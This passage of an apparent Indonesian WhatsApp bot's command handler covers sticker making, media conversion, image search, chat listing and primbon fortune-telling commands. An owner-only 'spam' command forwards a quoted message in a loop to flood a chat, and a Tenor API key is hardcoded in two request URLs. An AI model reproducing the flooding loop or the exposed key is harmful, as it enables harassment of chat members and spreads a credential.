jansen.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'ephemeral': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Masukkan value enable/disable'
if (args[0] === 'enable') {
await jansen.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'disable') {
await jansen.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}
break
//=================================================//
case 'delete': case 'del': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
jansen.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
//=================================================//
case 'infochat': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) m.reply('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
jansen.sendTextWithMentions(m.chat, teks, m)
}
break
//=================================================//
case 'q': case 'quoted': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) return m.reply('Reply Pesannya!!')
let wokwol = await jansen.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
//=================================================//
case 'listpc': {
if (isBan) throw sticBanLu(from)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 jansen.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
case 'listgc': {
if (isBan) throw sticBanLu(from)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await jansen.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 jansen.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
 case 'listonline': case 'liston': {
 if (isBan) throw sticBanLu(from)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
jansen.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
//=================================================//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await jansen.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await jansen.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'ebinary': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} text`
let { eBinary } = require('./basejansen/lib/binary')
let eb = await eBinary(text)
reply(eb)
}
break
//=================================================//
case 'dbinary': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} text`
let { dBinary } = require('./basejansen/lib/binary')
let db = await dBinary(text)
reply(db)
}
break
//=================================================//
case 'emojimix': {
if (isBan) throw sticBanLu(from)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await jansen.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await jansen.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
/* case 'attp': case 'ttp': {
 if (isBan) throw sticBanLu(from)
 if (!text) throw `Example : ${prefix + command} text`
 await jansen.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'jansen', 'morou', m, {asSticker: true})
 }
 break*/
case 'spam': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.quoted) return m.reply("Reply pesanya!")
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
quoted.copyNForward(m.chat, true)
}
} 
break
//=================================================//

case 'smeme': case 'stickermeme': case 'stickmeme': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
sticWait(from)
arg = args.join(' ')
mee = await jansen.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('./basejansen/lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await jansen.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
case 'toimage': case 'toimg': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await jansen.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
jansen.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./basejansen/lib/uploader')
let media = await jansen.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await jansen.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
}
break
case 'toaud': case 'toaudio': {
if (isBan) throw sticBanLu(from)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./basejansen/lib/converter')
let audio = await toAudio(media, 'mp4')
jansen.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted: m })
}
break
case 'tomp3': {
if (isBan) throw sticBanLu(from)
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./basejansen/lib/converter')
let audio = await toAudio(media, 'mp4')
jansen.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${jansen.user.name}.mp3`}, { quoted: m })
}
break
case 'tovn': case 'toptt': {
if (isBan) throw sticBanLu(from)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./basejansen/lib/converter')
let audio = await toPTT(media, 'mp4')
jansen.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
case 'togif': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./basejansen/lib/uploader')
let media = await jansen.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await jansen.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (isBan) throw sticBanLu(from)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./basejansen/lib/uploader')
let media = await jansen.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//=================================================//
case 'gimage': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} kaori cicak`
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
const mllo = {
image: { url: images },
caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`
}
jansen.sendMessage(m.chat, mllo, { quoted: m })
})
}
break
//=================================================//
case 'pinterest': {
if (isBan) throw sticBanLu(from)
let { pinterest } = require('./basejansen/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
jansen.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
//=================================================//
case 'couple': {
if (isBan) throw sticBanLu(from)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
jansen.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
jansen.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
}
break
case 'coffe': case 'kopi': {
if (isBan) throw sticBanLu(from)
const ko = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`
}
jansen.sendMessage(m.chat, ko, { quoted: m })
}
break
//=================================================//
case 'wallpaper': {
if (isBan) throw sticBanLu(from)
if (!text) throw 'Masukkan Query Title'
let { wallpaper } = require('./basejansen/lib/scraper')
anu = await wallpaper(text)
result = anu[Math.floor(Math.random() * anu.length)]
const mlo = {
image: { url: result.image[0] },
caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
}
jansen.sendMessage(m.chat, mlo, { quoted: m })
}
break
//=================================================//
case 'wikimedia': {
if (isBan) throw sticBanLu(from)
if (!text) throw 'Masukkan Query Title'
let { wikimedia } = require('./basejansen/lib/scraper')
anu = await wikimedia(text)
result = anu[Math.floor(Math.random() * anu.length)]
const mbk = {
image: { url: result.image },
caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`
}
jansen.sendMessage(m.chat, mbk, { quoted: m })
}
break
//=================================================//
case 'quotesanime': case 'quoteanime': {
if (isBan) throw sticBanLu(from)
let { quotesAnime } = require('./basejansen/lib/scraper')
let anu = await quotesAnime()
result = anu[Math.floor(Math.random() * anu.length)]
const anualas = {
text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`
}
jansen.sendMessage(m.chat, anualas, { quoted: m })
}
break
//=================================================//
case 'nomerhoki': case 'nomorhoki': {
if (isBan) throw sticBanLu(from)
if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
}
break
//=================================================//
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} belanja`
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command}✯𝐉𝚫𝐍𝐒𝚵𝐍✯, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command}✯𝐉𝚫𝐍𝐒𝚵𝐍✯, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'suamiistri': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command}✯𝐉𝚫𝐍𝐒𝚵𝐍✯, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalancinta': case 'ramalcinta': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command}✯𝐉𝚫𝐍𝐒𝚵𝐍✯, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command}✯𝐉𝚫𝐍𝐒𝚵𝐍✯Gans`
let anu = await primbon.arti_nama(text)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command}✯𝐉𝚫𝐍𝐒𝚵𝐍✯, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command}✯𝐉𝚫𝐍𝐒𝚵𝐍✯|Putri`
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return m.reply(anu.message)
jansen.sendImage(m.chat,anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (isBan) throw sticBanLu(from)
if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command}✯𝐉𝚫𝐍𝐒𝚵𝐍✯, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
jansen.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command}✯𝐉𝚫𝐍𝐒𝚵𝐍✯, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
